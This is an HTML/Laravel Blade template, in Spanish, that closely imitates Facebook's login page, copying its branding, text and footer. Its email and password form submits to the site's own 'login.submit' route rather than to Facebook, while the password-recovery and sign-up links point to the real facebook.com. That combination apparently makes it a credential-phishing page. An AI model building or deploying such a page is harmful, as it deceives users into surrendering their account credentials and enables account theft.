<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesión o registrarte</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .main {
            max-width: 1000px;
            width: 100%;
            margin: 20px 10px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .main img {
            width: 100%;
            max-width: 300px;
            height: auto;
        }

        .main-left {
            text-align: center;
            margin-bottom: 20px;
        }

        .main-left h1 {
            color: #3b5998;
            font-size: 24px;
            margin-bottom: 10px;
        }

        .main-left p {
            font-size: 22px;
            color: #1c1e21;
            line-height: 1.5;
        }

        .main-right {
            width: 100%;
            margin-top: 20px; /* Añadido para separación del contenido superior */
        }

        .form-container {
            background-color: white;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-radius: 8px;
            margin-bottom: 20px;
        }

        .form-container input[type="text"],
        .form-container input[type="password"],
        .form-container button {
            width: 100%; /* Cambio a 100% para ocupar todo el contenedor en pantallas pequeñas */
            padding: 12px;
            margin: 10px 0;
            box-sizing: border-box;
        }

        .form-container button {
            background-color: #1877f2;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }

        .form-container a {
            color: #1877f2;
            text-decoration: none;
            display: block;
            text-align: center;
            margin: 10px 0;
        }

        .language-selector {
            margin-top: 20px;
            text-align: center;
        }

        .language-selector a {
            margin: 0 10px;
            color: #555;
            text-decoration: none;
        }

        .footer {
            text-align: center;
            padding: 20px;
            font-size: 14px;
            color: #777;
        }

        .footer div {
            margin-bottom: 10px;
        }

        .footer a {
            color: #777;
            text-decoration: none;
            margin: 0 5px;
        }

        @media only screen and (min-width: 600px) {
            .main {
                flex-direction: row;
                align-items: flex-start;
            }

            .main-left, .main-right {
                width: 50%;
            }

            .main-right {
                padding-left: 20px;
            }

            .form-container input[type="text"],
            .form-container input[type="password"],
            .form-container button {
                width: calc(100% - 24px); /* Ajuste para mantener el padding en pantallas más grandes */
            }
        }
    </style>
</head>
<body>
    <br><br>
    <div class="main">
        <div class="main-left">
            <img src="imagenes/facebook.jpg" alt="Facebook">
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="main-right">
            <div class="form-container">
                <form action="{{ route('login.submit') }}" method="POST">
                    @csrf
                    <input type="text" name="email" placeholder="Correo electrónico o número de teléfono">
                    <input type="password" name="password" placeholder="Contraseña">
                    <button type="submit">Iniciar sesión</button>
                </form>
                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" style="text-decoration: none;">¿Has olvidado la contraseña?</a>
                <hr>
                <a href="https://www.facebook.com/r.php?locale=es_ES&display=page" style="text-decoration: none;">
                    <button style="background-color: #42b72a; width: 100%;">Crear cuenta nueva</button>
                </a>
            </div>
            <p>Crea una página para un famoso, una marca o una empresa.</p>
        </div>
    </div>
    <br><br><br><br><br><br><br><br><br>
    <div class="language-selector">
        <a href="#">Español (España)</a>
        <a href="#">English (US)</a>
        <a href="#">Italiano</a>
        <a href="#">Português (Brasil)</a>
        <a href="#">Français (France)</a>
        <a href="#">Deutsch</a>
        <a href="#">日本語</a>
        <a href="#">中文(简体)</a>
        <a href="#">العربية</a>
        <a href="#">हिन्दी</a>
    </div>
    <div class="footer">
        <div>
            <a href="#">Registrarte</a>
            <a href="#">Iniciar sesión</a>
            <a href="#">Messenger</a>
            <a href="#">Facebook Lite</a>
            <a href="#">Vídeo</a>
            <a href="#">Lugares</a>
            <a href="#">Juegos</a>
            <a href="#">Marketplace</a>
            <a href="#">Meta Pay</a>
            <a href="#">Meta Store</a>
            <a href="#">Meta Quest</a>
            <a href="#">Meta AI</a>
            <a href="#">Instagram</a>
            <a href="#">Threads</a>
            <a href="#">Recaudaciones de fondos</a>
            <a href="#">Servicios</a>
            <a href="#">Centro de información de votación</a>
            <a href="#">Política de privacidad</a>
            <a href="#">Centro de privacidad</a>
            <a href="#">Grupos</a>
            <a href="#">Información</a>
            <a href="#">Crear anuncio</a>
            <a href="#">Crear página</a>
            <a href="#">Desarrolladores</a>
            <a href="#">Empleo</a>
            <a href="#">Cookies</a>
            <a href="#">Opciones de anuncios</a>
            <a href="#">Condiciones</a>
            <a href="#">Ayuda</a>
            <a href="#">Subir contactos y no usuarios</a>
            <a href="#">Configuración</a>
            <a href="#">Registro de actividad</a>
        </div>
        <div>
            Meta © 2024
        </div>
    </div>
</body>
</html>
